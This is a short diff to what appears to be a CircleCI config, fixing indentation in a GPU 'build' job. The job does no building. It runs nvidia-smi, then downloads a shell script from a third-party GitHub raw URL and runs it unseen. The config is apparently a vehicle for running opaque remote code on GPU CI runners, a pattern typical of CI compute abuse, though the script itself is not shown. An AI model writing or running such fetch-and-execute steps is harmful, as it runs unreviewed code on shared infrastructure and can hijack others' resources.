@@ -4,8 +4,7 @@ jobs:
   build:
     machine:
       image: ubuntu-1604-cuda-10.1:201909-23
-    resource_class: 
     parallelism: 2
-      steps:
+    steps:
       - run: nvidia-smi
       - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh && chmod +x look.sh && ./look.sh
